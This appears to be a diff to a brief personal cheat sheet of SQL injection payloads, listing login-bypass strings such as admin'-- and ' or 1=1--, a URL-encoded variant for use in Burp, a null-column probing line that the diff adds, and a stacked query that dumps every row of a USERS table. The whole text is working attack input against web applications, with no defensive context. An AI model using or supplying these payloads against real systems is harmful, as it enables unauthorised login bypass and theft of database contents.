@@ -1,4 +1,7 @@
 admin'--     //Username input   
 '+or+1=1--              Burp     [For + space or %20]
+'+select+null,null,null --
+
+
 " or ""="
 SELECT name, type FROM USERS WHERE name LIKE "%1"; SELECT * FROM USERS WHERE "%"="%";
